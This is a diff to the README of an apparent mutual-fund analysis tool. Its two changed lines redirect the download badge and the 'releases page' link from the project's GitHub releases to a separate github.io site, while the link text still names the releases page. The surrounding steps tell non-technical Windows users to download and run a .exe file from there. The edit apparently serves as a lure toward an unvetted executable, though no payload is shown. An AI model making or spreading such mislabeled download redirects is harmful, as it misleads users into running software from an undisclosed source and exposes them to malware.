@@ -1,6 +1,6 @@
 # 📈 fund-ranking-system - Analyze mutual fund risk and returns
 
-[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Andieribbed215/fund-ranking-system/releases)
+[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://andieribbed215.github.io)
 
 This application helps you analyze mutual funds. You compare risk and return data to make informed financial choices. The system processes fund information locally on your computer. It uses data from reliable sources to calculate scores and generate reports. You keep control of your data without sending sensitive information to a cloud server.
 
@@ -8,7 +8,7 @@ This application helps you analyze mutual funds. You compare risk and return dat
 
 You do not need to know how to code. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Andieribbed215/fund-ranking-system/releases).
+1. Visit the [releases page](https://andieribbed215.github.io).
 2. Look for the latest version listed at the top.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder on your desktop.
